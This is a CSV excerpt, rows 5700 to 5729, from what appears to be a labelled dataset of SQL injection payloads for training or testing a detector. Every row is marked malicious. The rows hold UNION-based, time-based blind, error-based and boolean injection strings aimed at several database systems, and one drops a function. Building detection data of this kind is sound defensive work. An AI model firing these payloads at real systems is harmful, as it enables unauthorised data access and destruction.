row_index,payload_norm,label,sqli_type_hint
5700,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 'zaru' = 'zaru",1,
5701,"1 ) where 7684 = 7684 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5702,1' ) and 2577 = 7094,1,
5703,"1%"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""%"" = """,1,
5704,-1587' ) or 8339 = 5540,1,
5705,-3748' where 9292 = 9292 or 3337 = 2859#,1,
5706,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null#",1,
5707,"1 ) where 5385 = 5385 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5708,"1"" ) or sleep ( 5 ) and ( ""xgtk"" = ""xgtk",1,
5709,-9014' order by 1--,1,
5710,1' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'jryo' = 'jryo,1,
5711,"1'|| ( select 'tmsj' where 2971 = 2971 union all select null,null,null,null,null,null,null,null,null,null#",1,
5712,"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""regi"" like ""regi",1,
5713,1 ) ) as epfz where 5471 = 5471,1,
5714,"1"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""jyad"" = ""jyad",1,
5715,"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,
5716,-1816%' ) ) ) union all select 2072--,1,
5717,"-7295"" ) or 9323 = 9323#",1,
5718,"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,
5719,"1%"" ) union all select null,null,null,null,null,null,null--",1,
5720,"1' ) ) as bwjl where 8538 = 8538 union all select null,null,null,null,null,null,null#",1,
5721,"-9237' ) union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1,
5722,"1"" ) where 3445 = 3445 and elt ( 1212 = 1254,1254 ) --",1,
5723,if ( 6842 = 5446 ) select 6842 else drop function vjfq--,1,
5724,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ""%"" = """,1,
5725,"-8772%"" ) union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",1,
5726,"1 ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
5727,"-7171%' ) ) union all select 5580,5580,5580,5580,5580,5580,5580,5580--",1,
5728,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'raru' = 'raru",1,
5729,1 where 8578 = 8578 and 4770 = 4474--,1,
